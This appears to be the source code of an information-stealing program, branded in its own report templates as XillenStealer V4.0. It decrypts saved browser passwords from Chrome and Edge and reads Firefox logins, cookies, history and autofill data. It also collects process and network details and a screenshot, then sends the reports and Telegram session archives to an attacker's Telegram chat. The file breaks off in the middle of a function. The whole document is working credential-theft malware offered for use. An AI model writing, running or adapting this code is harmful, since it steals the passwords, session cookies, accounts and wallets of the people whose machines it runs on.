```python
import os
import platform
import getpass
import psutil
import uuid
import requests
import re
from datetime import datetime
import sys
import sqlite3
import shutil
import json
import base64
# Removed: from Crypto.Cipher import AES - replaced with cryptography
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from glob import glob
import tempfile
import subprocess
import traceback
import zipfile
import time
import threading
import hashlib
import random
import string
from cryptography.fernet import Fernet
import pickle
import gzip
import io
import ctypes.wintypes
import array
import mmap
import select
import pathlib
import socket
from PIL import ImageGrab # Assuming Pillow is installed

# Global configuration and utilities
config = None   # Will be initialized later
bot = None      # Will be initialized later
DEBUG = True
OSTYPE = platform.system()

def log(message):
    """Logs a message to the console and a debug file."""
    print(f"[LOG] {message}")
    try:
        with open("debug.log", "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] {message}\n")
    except Exception as e:
        print(f"[ERROR] Failed to write to debug log: {e}")

def getchromemasterkey():
    """Retrieves the Chrome master key for password decryption."""
    try:
        if OSTYPE == "Windows":
            localstatepath = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Local State')
        else:
            localstatepath = os.path.expanduser('~/.config/google-chrome/Local State')

        if not os.path.exists(localstatepath):
            log("Chrome Local State file not found.")
            return None

        with open(localstatepath, 'r', encoding='utf-8') as f:
            localstate = json.load(f)

        encrypted_key_base64 = localstate.get('os_crypt', {}).get('encrypted_key', '')
        if not encrypted_key_base64:
            log("Encrypted key not found in Local State.")
            return None

        encrypted_key = base64.b64decode(encrypted_key_base64)
        # Remove the DPAPI prefix if present (common on Windows)
        if encrypted_key.startswith(b'DPAPI'):
            encrypted_key = encrypted_key[5:]

        try:
            # Using win32crypt for Windows DPAPI decryption
            import win32crypt
            masterkey = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return masterkey
        except ImportError:
            log("win32crypt module not found. Chrome password decryption will not work on Windows.")
            # For non-Windows systems or if win32crypt is unavailable, a fallback might be needed if Chrome uses a different mechanism.
            # For simplicity, we'll return None if win32crypt is missing on Windows.
            return None
        except Exception as dpapi_err:
            log(f"Error decrypting DPAPI key: {dpapi_err}")
            return None
    except Exception as e:
        log(f"Error retrieving Chrome master key: {e}")
        return None

def decrypt_aes_gcm(ciphertext, key):
    """Decrypts data using AES-GCM."""
    try:
        # GCM expects nonce to be 12 bytes
        nonce = ciphertext[3:15]
        encrypted_data = ciphertext[15:-16]
        tag = ciphertext[-16:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
        decryptor = cipher.decryptor()
        decryptor.authenticate_additional_data(b'') # No AAD for this case
        plaintext = decryptor.update(encrypted_data) + decryptor.finalize_with_tag(tag)
        return plaintext
    except Exception as e:
        log(f"AES-GCM decryption failed: {e}")
        return None

def decrypt_aes_cbc(ciphertext, key):
    """Decrypts data using AES-CBC with PKCS7 padding."""
    try:
        iv = ciphertext[3:15] # Assuming IV is at this position
        encrypted_data = ciphertext[15:]

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        plaintext_padded = decryptor.update(encrypted_data) + decryptor.finalize()

        # Unpad PKCS7
        unpadder = padding.PKCS7(algorithms.AES(key).block_size).unpadder()
        plaintext = unpadder.update(plaintext_padded) + unpadder.finalize()
        return plaintext
    except Exception as e:
        log(f"AES-CBC decryption failed: {e}")
        return None

def decryptchromepassword(ciphertext, masterkey):
    """Decrypts a Chrome password using the master key."""
    if not masterkey:
        return "[DECRYPTIONKEYMISSING]"
    if not ciphertext:
        return "[NOCIPHERTEXT]"

    try:
        # Chrome uses different encryption versions, handle common ones
        # Version 10/11: AES-GCM
        if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v11'):
            plaintext = decrypt_aes_gcm(ciphertext, masterkey)
            if plaintext:
                return plaintext.decode('utf-8', errors='replace')
            else:
                return "[DECRYPTIONFAILED_GCM]"
        else:
            # Attempt AES-CBC decryption as a fallback
            plaintext = decrypt_aes_cbc(ciphertext, masterkey)
            if plaintext:
                return plaintext.decode('utf-8', errors='replace')
            else:
                return "[DECRYPTIONFAILED_CBC]"

    except Exception as e:
        log(f"Error decrypting Chrome password: {e}")
        return "[DECRYPTIONERROR]"

def copy_db_and_connect(dbpath):
    """Copies a SQLite DB to a temporary location and returns a connection."""
    if not os.path.exists(dbpath):
        return None, None
    try:
        tempdbpath = os.path.join(tempfile.gettempdir(), f"{os.path.basename(dbpath)}_{random.randint(1000, 9999)}.db")
        shutil.copy2(dbpath, tempdbpath)
        conn = sqlite3.connect(tempdbpath)
        return conn, tempdbpath
    except Exception as e:
        log(f"Failed to copy or connect to DB {dbpath}: {e}")
        return None, None

def close_db_connection(conn, tempdbpath):
    """Closes the SQLite connection and removes the temporary file."""
    if conn:
        conn.close()
    if tempdbpath and os.path.exists(tempdbpath):
        try:
            os.remove(tempdbpath)
        except Exception as e:
            log(f"Failed to remove temporary DB file {tempdbpath}: {e}")

def collectbrowserpasswords():
    """Collects passwords from Chrome and Edge browsers."""
    passwords = []
    browsers = {
        "Chrome": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
        "Edge": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
    }
    masterkey = getchromemasterkey()

    for browsername, dbpath in browsers.items():
        conn, tempdbpath = copy_db_and_connect(dbpath)
        if conn:
            try:
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, username, passwordencrypted in cursor.fetchall():
                    if username and passwordencrypted:
                        decryptedpassword = decryptchromepassword(passwordencrypted, masterkey)
                        passwords.append({
                            'url': url,
                            'username': username,
                            'password': decryptedpassword,
                            'browser': browsername
                        })
            except Exception as e:
                log(f"Error processing {browsername} login data: {e}")
            finally:
                close_db_connection(conn, tempdbpath)

    # Firefox passwords
    firefoxprofilespath = os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles')
    if os.path.exists(firefoxprofilespath):
        for profilefolder in os.listdir(firefoxprofilespath):
            if profilefolder.endswith(('.default', '.default-release')):
                loginsfile = os.path.join(firefoxprofilespath, profilefolder, 'logins.json')
                if os.path.exists(loginsfile):
                    try:
                        with open(loginsfile, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            # Firefox passwords in logins.json are typically base64 encoded but not master-key encrypted by default in the file itself.
                            # The actual decryption happens within Firefox. We'll attempt to decode if it looks like base64.
                            for login in data.get('logins', []):
                                password_raw = login.get('password', '[ENCRYPTED]')
                                if isinstance(password_raw, str) and len(password_raw) > 10 and all(c in string.ascii_letters + string.digits + '+/=' for c in password_raw):
                                    try:
                                        # Attempt to decode as base64, might not always be the case
                                        decoded_password = base64.b64decode(password_raw).decode('utf-8', errors='replace')
                                        password_to_add = decoded_password
                                    except:
                                        password_to_add = password_raw # Keep as is if not decodable base64
                                else:
                                    password_to_add = password_raw

                                passwords.append({
                                    'url': login.get('hostname', ''),
                                    'username': login.get('username', ''),
                                    'password': password_to_add,
                                    'browser': 'Firefox'
                                })
                    except Exception as e:
                        log(f"Error processing Firefox logins.json: {e}")
    return passwords

def collectbrowsercookies():
    """Collects cookies from Chrome, Edge, and Firefox browsers."""
    cookies = []
    browsers = {
        "Chrome": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
        "Edge": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies')
    }

    for browsername, dbpath in browsers.items():
        conn, tempdbpath = copy_db_and_connect(dbpath)
        if conn:
            try:
                cursor = conn.cursor()
                # Adjust query for relevant columns, add secure/httponly if available
                cursor.execute("SELECT name, value, domain_name, path, expires_utc, is_secure, is_httponly FROM cookies")
                for name, value, domain, path, expires, secure, httponly in cursor.fetchall():
                    cookies.append({
                        'name': name,
                        'value': value,
                        'domain': domain,
                        'path': path,
                        'expiresutc': expires,
                        'secure': bool(secure),
                        'httponly': bool(httponly),
                        'browser': browsername
                    })
            except Exception as e:
                log(f"Error processing {browsername} cookies: {e}")
            finally:
                close_db_connection(conn, tempdbpath)

    # Firefox cookies
    firefoxprofilespath = os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles')
    if os.path.exists(firefoxprofilespath):
        for profilefolder in os.listdir(firefoxprofilespath):
            if profilefolder.endswith(('.default', '.default-release')):
                cookiesdb = os.path.join(firefoxprofilespath, profilefolder, 'cookies.sqlite')
                conn, tempdbpath = copy_db_and_connect(cookiesdb)
                if conn:
                    try:
                        cursor = conn.cursor()
                        cursor.execute("SELECT name, value, host, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
                        for name, value, domain, path, expiry, secure, httponly in cursor.fetchall():
                            cookies.append({
                                'name': name,
                                'value': value,
                                'domain': domain,
                                'path': path,
                                'expiry': expiry,
                                'secure': bool(secure),
                                'httponly': bool(httponly),
                                'browser': 'Firefox'
                            })
                    except Exception as e:
                        log(f"Error processing Firefox cookies.sqlite: {e}")
                    finally:
                        close_db_connection(conn, tempdbpath)
    return cookies

def collectprocesses():
    """Collects information about running processes."""
    processes = []
    try:
        # Fetch all process info in one go for potential performance gain
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'create_time']):
            try:
                processes.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'username': proc.info.get('username', 'N/A'),
                    'cpupercent': proc.info['cpu_percent'],
                    'memorypercent': proc.info['memory_percent'],
                    'createtime': datetime.fromtimestamp(proc.info['create_time']).isoformat() if proc.info.get('create_time') else 'N/A'
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
            except Exception as e:
                log(f"Unexpected error collecting process info for PID {proc.info.get('pid', 'N/A')}: {e}")
    except Exception as e:
        log(f"Error iterating through processes: {e}")
    return processes

def collectconnections():
    """Collects information about network connections."""
    connections = []
    try:
        # Fetch all connections once
        all_connections = psutil.net_connections(kind='inet')
        for conn in all_connections:
            localaddress = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A"
            remoteaddress = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A"
            connections.append({
                'localaddress': localaddress,
                'remoteaddress': remoteaddress,
                'status': conn.status,
                'pid': conn.pid
            })
    except Exception as e:
        log(f"Error collecting network connections: {e}")
    return connections

def collectbrowserhistory():
    """Collects browsing history from Chrome and Edge."""
    history = []
    browsers = {
        "Chrome": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'History'),
        "Edge": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'History')
    }

    for browsername, dbpath in browsers.items():
        conn, tempdbpath = copy_db_and_connect(dbpath)
        if conn:
            try:
                cursor = conn.cursor()
                # Fetching more relevant fields and ordering by visit time
                # Use a slightly larger limit for potentially more comprehensive results
                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 150")
                for url, title, visitcount, lastvisittime in cursor.fetchall():
                    # Convert lastvisittime from Chrome's format (microseconds since epoch)
                    try:
                        # Ensure lastvisittime is not zero or None before conversion
                        visittimeiso = datetime.fromtimestamp(lastvisittime / 1000000).isoformat() if lastvisittime and lastvisittime > 0 else None
                    except:
                        visittimeiso = None
                    history.append({
                        'url': url,
                        'title': title,
                        'visitcount': visitcount,
                        'lastvisit': visittimeiso,
                        'browser': browsername
                    })
            except Exception as e:
                log(f"Error processing {browsername} history: {e}")
            finally:
                close_db_connection(conn, tempdbpath)
    return history

def collectautofilldata():
    """Collects autofill data from Chrome and Edge."""
    autofill = []
    browsers = {
        "Chrome": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data'),
        "Edge": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')
    }

    for browsername, dbpath in browsers.items():
        conn, tempdbpath = copy_db_and_connect(dbpath)
        if conn:
            try:
                cursor = conn.cursor()
                # Fetching relevant autofill data
                cursor.execute("SELECT name, value, date_created FROM autofill ORDER BY date_created DESC LIMIT 100") # Increased limit
                for name, value, datecreated in cursor.fetchall():
                    try:
                        datecreatediso = datetime.fromtimestamp(datecreated / 1000000).isoformat() if datecreated and datecreated > 0 else None
                    except:
                        datecreatediso = None
                    autofill.append({
                        'name': name,
                        'value': value,
                        'datecreated': datecreatediso,
                        'browser': browsername
                    })
            except Exception as e:
                log(f"Error processing {browsername} autofill data: {e}")
            finally:
                close_db_connection(conn, tempdbpath)
    return autofill

def sendtelegramreport(collecteddata, language='ru'):
    """Sends collected data to Telegram with language support and improved formatting."""
    try:
        hostname = socket.gethostname()
        # Use a more reliable IP fetching service and handle potential errors
        try:
            ipresponse = requests.get('https://api.ipify.org?format=json', timeout=5)
            ipdata = ipresponse.json()
            ip = ipdata.get('ip', 'Unknown')
        except requests.RequestException:
            ip = "Unknown"

        # Fetch country name more robustly
        country = "Unknown"
        if ip != "Unknown":
            try:
                countryresponse = requests.get(f'https://ipapi.co/{ip}/countryname/', timeout=5)
                country = countryresponse.text.strip()
            except requests.RequestException:
                pass  # Country remains Unknown

        osinfo = f"{platform.system()} {platform.release()}"
        currenttime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Define captions for different languages
        captions = {
            'ru': {
                'htmltitle': "Полный отчет о системе",
                'txttitle': "Текстовый отчет",
                'screenshottitle': "Скриншот системы",
                'signature': "Создано командой Xillen Killers (t.me/XillenAdapter) | https://github.com/BengaminButton"
            },
            'en': {
                'htmltitle': "Full System Report",
                'txttitle': "Text Report",
                'screenshottitle': "System Screenshot",
                'signature': "Created by Xillen Killers team (t.me/XillenAdapter) | https://github.com/BengaminButton"
            }
        }
        langcaptions = captions.get(language, captions['ru'])  # Default to Russian if language not found

        # Generate HTML report
        htmlreportcontent = generatehtmlreportv4(collecteddata, language)
        htmlreportpath = os.path.join(tempfile.gettempdir(), "report.html")
        with open(htmlreportpath, "w", encoding="utf-8") as f:
            f.write(htmlreportcontent)

        # Generate TXT report
        txtreportcontent = generatetxtreportv4(collecteddata, language)
        txtreportpath = os.path.join(tempfile.gettempdir(), "report.txt")
        with open(txtreportpath, "w", encoding="utf-8") as f:
            f.write(txtreportcontent)

        # Take screenshot
        screenshotpath = None
        try:
            screenshotpath = os.path.join(tempfile.gettempdir(), "screen.jpg")
            # Use ImageGrab for screenshot, ensure Pillow is installed
            img = ImageGrab.grab()
            img.save(screenshotpath)
            log("Screenshot captured.")
        except Exception as e:
            log(f"Failed to capture screenshot: {e}")

        # Send HTML report
        htmlcaption = f"{langcaptions['htmltitle']}\n\n{langcaptions['signature']}"
        try:
            with open(htmlreportpath, "rb") as reportfile:
                if bot:
                    bot.send_document(config.TGCHATID, reportfile, caption=htmlcaption)
                log(f"HTML report to Telegram ID: {config.TGCHATID}")
        except Exception as e:
            log(f"Error sending HTML report to Telegram: {e}")

        # Send TXT report
        txtcaption = f"{langcaptions['txttitle']}\n\n{langcaptions['signature']}"
        try:
            with open(txtreportpath, "rb") as txtfile:
                if bot:
                    bot.send_document(config.TGCHATID, txtfile, caption=txtcaption)
                log(f"TXT report to Telegram ID: {config.TGCHATID}")
        except Exception as e:
            log(f"Error sending TXT report to Telegram: {e}")

        # Send screenshot
        if screenshotpath and os.path.exists(screenshotpath):
            screenshotcaption = f"{langcaptions['screenshottitle']}\n\n{langcaptions['signature']}"
            try:
                with open(screenshotpath, "rb") as photo:
                    if bot:
                        bot.send_photo(config.TGCHATID, photo, caption=screenshotcaption)
                    log(f"Screenshot sent to Telegram ID: {config.TGCHATID}")
            except Exception as e:
                log(f"Error sending screenshot to Telegram: {e}")

        # Send Telegram tdata archives if any
        tdataarchives = collecteddata.get('telegramtdata', [])
        if tdataarchives:
            for i, archivepath in enumerate(tdataarchives, 1):
                if os.path.exists(archivepath):
                    archivecaption = f"Telegram tdata archive {i}/{len(tdataarchives)}\n\n{langcaptions['signature']}"
                    try:
                        with open(archivepath, "rb") as archivefile:
                            if bot:
                                bot.send_document(config.TGCHATID, archivefile, caption=archivecaption)
                            log(f"Telegram tdata archive {i} sent successfully.")
                            os.remove(archivepath)  # Clean up archive after sending
                    except Exception as e:
                        log(f"Error sending Telegram tdata archive {i}: {e}")

        # Clean up temporary files
        if os.path.exists(htmlreportpath):
            os.remove(htmlreportpath)
        if os.path.exists(txtreportpath):
            os.remove(txtreportpath)
        if screenshotpath and os.path.exists(screenshotpath):
            os.remove(screenshotpath)

        log("Telegram report sending process completed.")

    except Exception as e:
        log(f"Critical error during Telegram report sending: {e}")
        log(traceback.format_exc())


# Placeholder functions for report generation (replace with actual implementations)
def generatehtmlreportv4(collecteddata, language):
    """Placeholder for HTML report generation."""
    templates = {
        'ru': {
            'title': 'XillenStealer Report V4.0',
            'header': 'Отчет XillenStealer V4.0',
            'system': 'Системная информация',
            'browsers': 'Данные браузеров',
            'wallets': 'Крипто-кошельки',
            'signature': 'Создано командой Xillen Killers (t.me/XillenAdapter) | https://github.com/BengaminButton'
        },
        'en': {
            'title': 'XillenStealer Report V4.0',
            'header': 'XillenStealer Report V4.0',
            'system': 'System Information',
            'browsers': 'Browser Data',
            'wallets': 'Crypto Wallets',
            'signature': 'Created by Xillen Killers team (t.me/XillenAdapter) | https://github.com/BengaminButton'
        }
    }
    template = templates.get(language, templates['ru'])

    html = f"""
    <!DOCTYPE html>
    <html lang="{language}">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{template['title']}</title>
        <style>
            body {{ font-family: sans-serif; margin: 20px; }}
            h1, h2 {{ color: #333; }}
            table {{ width: 100%; border-collapse: collapse; margin-bottom: 20px; }}
            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
            th {{ background-color: #f2f2f2; }}
            .signature {{ font-size: 0.8em; color: #888; margin-top: 30px; }}
            .data-item {{ margin-bottom: 10px; }}
            .data-item strong {{ display: block; margin-bottom: 5px; }}
        </style>
    </head>
    <body>
        <h1>{template['header']}</h1>

        <h2>{template['system']}</h2>
        <table>
            <tr><th>Key</th><th>Value</th></tr>
            <tr><td>Hostname</td><td>{collecteddata.get('systeminfo', {}).get('hostname', 'N/A')}</td></tr>
            <tr><td>OS</td><td>{collecteddata.get('systeminfo', {}).get('os', 'N/A')}</td></tr>
            <tr><td>Architecture</td><td>{collecteddata.get('systeminfo', {}).get('architecture', 'N/A')}</td></tr>
            <tr><td>Processor</td><td>{collecteddata.get('systeminfo', {}).get('processor', 'N/A')}</td></tr>
            <tr><td>User</td><td>{collecteddata.get('systeminfo', {}).get('user', 'N/A')}</td></tr>
            <tr><td>CPU Cores</td><td>{collecteddata.get('systeminfo', {}).get('cpucount', 'N/A')}</td></tr>
            <tr><td>Memory (GB)</td><td>{collecteddata.get('systeminfo', {}).get('memorygb', 'N/A')}</td></tr>
            <tr><td>IP Address</td><td>{collecteddata.get('systeminfo', {}).get('ipaddress', 'N/A')}</td></tr>
            <tr><td>MAC Address</td><td>{collecteddata.get('systeminfo', {}).get('macaddress', 'N/A')}</td></tr>
        </table>

        <h2>{template['browsers']}</h2>
        <h3>Passwords</h3>
        {formatpasswordtable(collecteddata.get('passwords', []))}
        <h3>Cookies</h3>
        {formatcookietable(collecteddata.get('cookies', []))}
        <h3>History</h3>
        {formathistorytable(collecteddata.get('history', []))}
        <h3>Autofill Data</h3>
        {formatautofilltable(collecteddata.get('autofill', []))}

        <h2>Processes</h2>
        {formatprocesstable(collecteddata.get('processes', []))}

        <h2>Network Connections</h2>
        {formatconnectiontable(collecteddata.get('networkconnections', []))}

        <h2>Configuration Files</h2>
        <div class="data-container">
            {''.join(f"<div class='data-item'><strong>{item.splitlines()[0]}</strong><pre>{'\\n'.join(item.splitlines()[1:])}</pre></div>" for item in collecteddata.get('configfiles', [])) if collecteddata.get('configfiles') else "<p>No configuration files found.</p>"}
        </div>

        <h2>FTP/SSH Client Data</h2>
        <div class="data-container">
            {''.join(f"<div class='data-item'><strong>{item.splitlines()[0]}</strong><pre>{'\\n'.join(item.splitlines()[1:])}</pre></div>" for item in collecteddata.get('ftpsshclients', [])) if collecteddata.get('ftpsshclients') else "<p>No FTP/SSH client data found.</p>"}
        </div>

        <h2>Database Files</h2>
        <div class="data-container">
            {formatdatabaseinfo(collecteddata.get('databases', [])) if collecteddata.get('databases') else "<p>No database files found.</p>"}
        </div>

        <h2>Backup Files</h2>
        <div class="data-container">
            {formatbackupinfo(collecteddata.get('backups', [])) if collecteddata.get('backups') else "<p>No backup files found.</p>"}
        </div>

        <h2>Telegram tdata Archives</h2>
        <div class="data-container">
            {formatarchiveinfo(collecteddata.get('telegramtdata', [])) if collecteddata.get('telegramtdata') else "<p>No Telegram tdata archives found.</p>"}
        </div>

        <h2>Cryptocurrency Wallets</h2>
        <div class="data-container">
            {''.join(f"<div class='data-item'><strong>{item.splitlines()[0]}</strong><pre>{'\\n'.join(item.splitlines()[1:])}</pre></div>" for item in collecteddata.get('cryptowallets', [])) if collecteddata.get('cryptowallets') else "<p>No cryptocurrency wallet data found.</p>"}
        </div>


        <p class="signature">{template['signature']}</p>
    </body>
    </html>
    """
    return html

def generatetxtreportv4(collecteddata, language):
    """Placeholder for TXT report generation."""
    templates = {
        'ru': {
            'title': 'XillenStealer Report V4.0 (Text)',
            'header': 'Отчет XillenStealer V4.0 (Текстовый формат)',
            'system': 'Системная информация:',
            'browsers': 'Данные браузеров:',
            'wallets': 'Крипто-кошельки:',
            'processes': 'Процессы:',
            'connections': 'Сетевые соединения:',
            'configs': 'Конфигурационные файлы:',
            'ftpssh': 'Данные FTP/SSH клиентов:',
            'databases': 'Базы данных:',
            'backups': 'Резервные копии:',
            'telegramtdata': 'Архивы Telegram tdata:',
            'signature': 'Создано командой Xillen Killers (t.me/XillenAdapter) | https://github.com/BengaminButton'
        },
        'en': {
            'title': 'XillenStealer Report V4.0 (Text)',
            'header': 'XillenStealer Report V4.0 (Text Format)',
            'system': 'System Information:',
            'browsers': 'Browser Data:',
            'wallets': 'Crypto Wallets:',
            'processes': 'Processes:',
            'connections': 'Network Connections:',
            'configs': 'Configuration Files:',
            'ftpssh': 'FTP/SSH Client Data:',
            'databases': 'Database Files:',
            'backups': 'Backup Files:',
            'telegramtdata': 'Telegram tdata Archives:',
            'signature': 'Created by Xillen Killers team (t.me/XillenAdapter) | https://github.com/BengaminButton'
        }
    }
    template = templates.get(language, templates['ru'])

    report = f"{template['header']}\n"
    report += f"{'-' * len(template['header'])}\n\n"

    report += f"{template['system']}\n"
    sysinfo = collecteddata.get('systeminfo', {})
    for key, value in sysinfo.items():
        report += f"  {key.replace('_', ' ').title()}: {value}\n"
    report += "\n"

    report += f"{template['browsers']}\n"
    passwords = collecteddata.get('passwords', [])
    if passwords:
        report += "  Passwords:\n"
        for pw in passwords:
            report += f"    - URL: {pw.get('url', 'N/A')}, User: {pw.get('username', 'N/A')}, Pass: {pw.get('password', 'N/A')}, Browser: {pw.get('browser', 'N/A')}\n"
    cookies = collecteddata.get('cookies', [])
    if cookies:
        report += "  Cookies:\n"
        for cookie in cookies:
            report += f"    - Domain: {cookie.get('domain', 'N/A')}, Name: {cookie.get('name', 'N/A')}, Value: {cookie.get('value', 'N/A')[:50]}..., Browser: {cookie.get('browser', 'N/A')}\n"
    history = collecteddata.get('history', [])
    if history:
        report += "  History:\n"
        for hist in history[:5]:  # Limit for brevity
            report += f"    - URL: {hist.get('url', 'N/A')}, Title: {hist.get('title', 'N/A')}, Browser: {hist.get('browser', 'N/A')}\n"
    autofill = collecteddata.get('autofill', [])
    if autofill:
        report += "  Autofill:\n"
        for af in autofill[:5]:  # Limit for brevity
            report += f"    - Name: {af.get('name', 'N/A')}, Value: {af.get('value', 'N/A')}, Browser: {af.get('browser', 'N/A')}\n"
    report += "\n"

    report += f"{template['processes']}\n"
    processes = collecteddata.get('processes', [])
    if processes:
        for proc in processes[:10]:  # Limit for brevity
            report += f"  PID: {proc.get('pid', 'N/A')}, Name: {proc.get('name', 'N/A')}, User: {proc.get('username', 'N/A')}, CPU: {proc.get('cpupercent', 'N/A')}% Mem: {proc.get('memorypercent', 'N/A')}%\n"
    report += "\n"

    report += f"{template['connections']}\n"
    connections = collecteddata.get('connections', [])
    if connections:
        for conn in connections[:10]:  # Limit for brevity
            report += f"  Local: {conn.get('localaddress', 'N/A')}, Remote: {conn.get('remoteaddress', 'N/A')}, Status: {conn.get('status', 'N/A')}\n"
    report += "\n"

    report += f"{template['configs']}\n"
    configs = collecteddata.get('configfiles', [])
    if configs:
        for cfg in configs[:5]: # Limit for brevity
            lines = cfg.splitlines()
            report += f"  File: {lines[0]}\n  Content:\n    " + "\n    ".join(lines[1:]) + "\n"
    else:
        report += "  No configuration files found.\n"
    report += "\n"

    report += f"{template['ftpssh']}\n"
    ftpssh = collecteddata.get('ftpsshclients', [])
    if ftpssh:
        for client in ftpssh[:5]: # Limit for brevity
            lines = client.splitlines()
            report += f"  Client: {lines[0]}\n  Content:\n    " + "\n    ".join(lines[1:]) + "\n"
    else:
        report += "  No FTP/SSH client data found.\n"
    report += "\n"

    report += f"{template['databases']}\n"
    databases = collecteddata.get('databases', [])
    if databases:
        for db in databases[:10]: # Limit for brevity
            report += f"  - {db}\n"
    else:
        report += "  No database files found.\n"
    report += "\n"

    report += f"{template['backups']}\n"
    backups = collecteddata.get('backups', [])
    if backups:
        for backup in backups[:10]: # Limit for brevity
            report += f"  - {backup}\n"
    else:
        report += "  No backup files found.\n"
    report += "\n"

    report += f"{template['telegramtdata']}\n"
    tdata_archives = collecteddata.get('telegramtdata', [])
    if tdata_archives:
        for i, archive_path in enumerate(tdata_archives):
            report += f"  - Archive {i+1}: {os.path.basename(archive_path)}\n"
    else:
        report += "  No Telegram tdata archives found.\n"
    report += "\n"

    report += f"{template['wallets']}\n"
    wallets = collecteddata.get('cryptowallets', [])
    if wallets:
        for wallet_info in wallets[:5]: # Limit for brevity
            lines = wallet_info.splitlines()
            report += f"  File: {lines[0]}\n  Content (Base64):\n    " + "\n    ".join(lines[1:]) + "\n"
    else:
        report += "  No cryptocurrency wallet data found.\n"
    report += "\n"


    report += f"{template['signature']}\n"
    return report

# Helper functions for formatting tables in HTML report
def formatpasswordtable(passwords):
    if not passwords: return "<p>No passwords found.</p>"
    html = "<table><tr><th>URL</th><th>Username</th><th>Password</th><th>Browser</th></tr>"
    for pw in passwords:
        # Basic HTML escaping for safety, though values are usually plain text
        url = html_escape(pw.get('url', 'N/A'))
        username = html_escape(pw.get('username', 'N/A'))
        password = html_escape(pw.get('password', 'N/A'))
        browser = html_escape(pw.get('browser', 'N/A'))
        html += f"<tr><td>{url}</td><td>{username}</td><td>{password}</td><td>{browser}</td></tr>"
    html += "</table>"
    return html

def formatcookietable(cookies):
    if not cookies: return "<p>No cookies found.</p>"
    html = "<table><tr><th>Domain</th><th>Name</th><th>Value</th><th>Path</th><th>Expires</th><th>Secure</th><th>HTTPOnly</th><th>Browser</th></tr>"
    for cookie in cookies:
        domain = html_escape(cookie.get('domain', 'N/A'))
        name = html_escape(cookie.get('name', 'N/A'))
        value = html_escape(cookie.get('value', 'N/A'))
        path = html_escape(cookie.get('path', 'N/A'))
        expires = cookie.get('expiresutc') or cookie.get('expiry', 'N/A')
        secure = cookie.get('secure', False)
        httponly = cookie.get('httponly', False)
        browser = html_escape(cookie.get('browser', 'N/A'))
        html += f"<tr><td>{domain}</td><td>{name}</td><td>{value}</td><td>{path}</td><td>{expires}</td><td>{secure}</td><td>{httponly}</td><td>{browser}</td></tr>"
    html += "</table>"
    return html

def formathistorytable(history):
    if not history: return "<p>No history found.</p>"
    html = "<table><tr><th>URL</th><th>Title</th><th>Visits</th><th>Last Visit</th><th>Browser</th></tr>"
    for hist in history:
        url = html_escape(hist.get('url', 'N/A'))
        title = html_escape(hist.get('title', 'N/A'))
        visitcount = hist.get('visitcount', 'N/A')
        lastvisit = hist.get('lastvisit', 'N/A')
        browser = html_escape(hist.get('browser', 'N/A'))
        html += f"<tr><td>{url}</td><td>{title}</td><td>{visitcount}</td><td>{lastvisit}</td><td>{browser}</td></tr>"
    html += "</table>"
    return html

def formatautofilltable(autofill):
    if not autofill: return "<p>No autofill data found.</p>"
    html = "<table><tr><th>Name</th><th>Value</th><th>Date Created</th><th>Browser</th></tr>"
    for af in autofill:
        name = html_escape(af.get('name', 'N/A'))
        value = html_escape(af.get('value', 'N/A'))
        datecreated = af.get('datecreated', 'N/A')
        browser = html_escape(af.get('browser', 'N/A'))
        html += f"<tr><td>{name}</td><td>{value}</td><td>{datecreated}</td><td>{browser}</td></tr>"
    html += "</table>"
    return html

def formatprocesstable(processes):
    if not processes: return "<p>No processes found.</p>"
    html = "<table><tr><th>PID</th><th>Name</th><th>Username</th><th>CPU (%)</th><th>Memory (%)</th><th>Created</th></tr>"
    for proc in processes:
        pid = html_escape(str(proc.get('pid', 'N/A')))
        name = html_escape(proc.get('name', 'N/A'))
        username = html_escape(proc.get('username', 'N/A'))
        cpupercent = html_escape(str(proc.get('cpupercent', 'N/A')))
        memorypercent = html_escape(str(proc.get('memorypercent', 'N/A')))
        createtime = html_escape(proc.get('createtime', 'N/A'))
        html += f"<tr><td>{pid}</td><td>{name}</td><td>{username}</td><td>{cpupercent}</td><td>{memorypercent}</td><td>{createtime}</td></tr>"
    html += "</table>"
    return html

def formatconnectiontable(connections):
    if not connections: return "<p>No network connections found.</p>"
